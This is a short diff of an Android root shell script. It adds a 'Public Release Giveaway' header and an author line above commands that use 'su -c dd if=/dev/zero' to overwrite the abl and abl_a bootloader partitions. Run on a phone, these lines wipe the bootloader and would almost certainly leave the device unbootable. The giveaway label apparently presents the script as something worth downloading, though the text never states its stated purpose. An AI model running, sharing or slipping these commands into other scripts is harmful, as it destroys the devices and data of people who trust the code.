@@ -1,5 +1,7 @@
 #!/system/bin/sh
 #!/bin/bash
+# Dec 24 2024 # Public Release Giveaway
+# Author : x######
 # #clear
 su -c dd if=/dev/zero of=/dev/block/by-name/abl
 su -c dd if=/dev/zero of=/dev/block/by-name/abl_a
